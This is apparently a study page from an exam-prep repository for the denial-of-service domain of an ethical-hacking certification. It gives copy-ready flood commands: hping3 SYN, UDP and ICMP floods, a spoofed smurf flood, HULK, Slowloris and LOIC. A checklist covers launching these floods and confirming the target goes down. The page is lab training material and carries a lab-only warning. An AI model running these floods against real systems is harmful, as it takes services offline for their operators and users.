# 09 — Denial of Service

> DoS questions are usually "run tool X against lab target Y and show it's down / show packets in Wireshark." Expect 1–2 questions. **Never run these against anything outside the exam lab.**

## 🧭 Decision tree — "I see a DoS question"

```
What layer does the question target?
│
├── Layer 3/4 — raw packet flood
│   ├── SYN flood        → sudo hping3 -S --flood -p 80 <IP>
│   ├── UDP flood        → sudo hping3 --udp --flood -p 53 <IP>
│   ├── ICMP flood       → sudo hping3 -1 --flood <IP>
│   └── Smurf / amplif.  → sudo hping3 -1 --flood -a <SPOOFED> <BCAST>
│
├── Layer 7 — HTTP application flood
│   ├── HULK  (GET flood, randomized)  → python3 hulk.py http://<IP>/
│   ├── Slowloris (keeps sockets open) → slowloris <IP> -p 80 -s 500
│   └── LOIC (GUI)                     → target IP → method HTTP → IMMA CHARGIN MAH LAZER
│
└── "How do I verify it worked?"
    ├── Ping / curl the target from another box
    ├── Watch CPU / connections on the target (if you have access)
    └── Wireshark on the attacker — look at packet rate
```

## 📄 Files in this folder

- **[commands.md](commands.md)** — copy-paste recipes
- **[walkthroughs.md](walkthroughs.md)** — full multi-step examples
- Question bank: **[../questions/by-domain/09-dos.md](../questions/by-domain/09-dos.md)**

## 🛠 Tools used in this domain

- **[hping3](../tools/hping3.md)** ← layer 3/4 packet forger
- **[hulk](../tools/hulk.md)** — HTTP GET flood (python)
- **[slowloris](../tools/slowloris.md)** — slow-HTTP socket exhaustion
- **[LOIC](../tools/loic.md)** — GUI DoS (Windows)

## ✅ Domain checklist

- [ ] Launch a SYN flood with hping3 from memory (flags: `-S --flood -p`)
- [ ] Launch a UDP flood and an ICMP flood with hping3
- [ ] Run HULK against a lab web server and confirm it stops responding
- [ ] Run Slowloris and understand why it's different from HULK (sockets vs bandwidth)
- [ ] Recognize SYN flood traffic in Wireshark (lots of SYNs, no ACKs)
- [ ] Stop all flood attacks cleanly (Ctrl-C) and verify target recovers
- [ ] Done all questions in [the question bank](../questions/by-domain/09-dos.md)
